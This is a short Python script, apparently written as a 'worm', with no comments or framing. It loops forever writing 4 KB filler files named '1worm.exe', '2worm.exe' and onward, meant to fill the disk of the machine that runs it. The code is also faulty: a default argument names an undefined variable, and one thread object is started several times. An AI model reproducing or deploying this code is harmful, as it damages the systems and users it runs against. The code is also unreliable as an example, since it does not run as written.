from threading import Thread

FilesMax = 1
FileName = str(FilesMax) + "worm.exe"
pila = []
def worm(data=data, FileName=FileName, FilesMax=FilesMax):
        while True:
          file = open(str(FileName), "wb")
          datafinal = "a" * 4090
          file.write(str(datafinal).encode())
          file.close()
          FilesMax = FilesMax + 1 
          FileName = str(FilesMax) + "worm.exe"
try:
        hilo = Thread(target=worm)
        for i in range(1, 5):
                hilo.setDaemon(True)
                hilo.start()
                pila.append(hilo)
except: worm()
